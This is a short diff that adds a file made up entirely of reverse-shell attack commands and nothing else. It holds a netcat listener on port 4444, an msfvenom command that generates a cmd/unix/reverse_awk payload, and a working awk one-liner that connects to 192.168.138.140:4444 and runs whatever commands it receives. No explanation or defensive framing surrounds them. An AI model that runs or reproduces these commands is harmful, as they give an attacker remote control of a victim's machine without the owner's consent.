@@ -1,0 +1,12 @@
+
+
+
+nc.exe -l -p 4444
+
+
+msfvenom.bat -p cmd/unix/reverse_awk LHOST=192.168.138.140
+
+awk 'BEGIN{s="/inet/tcp/0/192.168.138.140/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
+
+
+
